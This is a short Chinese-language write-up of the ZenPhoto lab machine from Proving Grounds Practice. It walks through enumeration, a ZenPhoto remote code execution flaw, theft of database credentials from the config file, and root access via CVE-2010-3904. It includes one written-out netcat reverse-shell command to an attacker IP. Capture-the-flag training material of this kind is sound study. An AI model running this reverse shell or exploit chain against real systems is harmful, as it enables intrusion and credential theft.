---
title: Proving Grounds Practice-ZenPhoto
date: 2025-6-05 20:00:00
tags: 红队
categories: 红队打靶-Linux
---

# 信息收集

## nmap

![image-20250605142130774](./ZenPhoto/image-20250605142130774.png)

# web

主页面就一行字，扫目录得到test目录

![image-20250605144428812](./ZenPhoto/image-20250605144428812.png)

test页面下才是cms的主页

![image-20250605170554558](./ZenPhoto/image-20250605170554558.png)

继续扫test目录，有robots目录，其中有很多可以访问的页面

![image-20250605144526209](./ZenPhoto/image-20250605144526209.png)

![image-20250605144533798](./ZenPhoto/image-20250605144533798.png)

![image-20250605154602217](./ZenPhoto/image-20250605154602217.png)

还有后台管理员页面，但是无法登录

![image-20250605144822402](./ZenPhoto/image-20250605144822402.png)

最后是在主页面的源码下看到版本号的

![image-20250605153349976](./ZenPhoto/image-20250605153349976.png)

该版本存在远程代码执行漏洞

![image-20250605153409178](./ZenPhoto/image-20250605153409178.png)

成功利用后可以命令执行

![image-20250605153414066](./ZenPhoto/image-20250605153414066.png)

可以执行该命令来反弹shell

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.243 80 >/tmp/f
```

![image-20250605153951962](./ZenPhoto/image-20250605153951962.png)

# 提权

前面robots目录下就给出了zp-data这个目录，但是其中的文件无法访问，拿到shell

之后去访问一下查看配置文件,其中有数据库账号密码，

`/var/www/test/zp-data/zp-config.php`

![image-20250605154526004](./ZenPhoto/image-20250605154526004.png)

本地开放了3306端口。可以在本地连接到数据库

![image-20250605154817984](./ZenPhoto/image-20250605154817984.png)

但是得到的这个密码是无法破解的

![image-20250605160327234](./ZenPhoto/image-20250605160327234.png)

查看内核搜索内核漏洞，14814这个exp利益失败

![image-20250605165244890](./ZenPhoto/image-20250605165244890.png)

上传`linpeas.sh`脚本，查看可以利用的cve,尝试后`cve-2010-3904`可以成功利用，上传到靶机编译之后再运行就可以获取root权限

![image-20250605165228111](./ZenPhoto/image-20250605165228111.png)

![image-20250605165711094](./ZenPhoto/image-20250605165711094.png)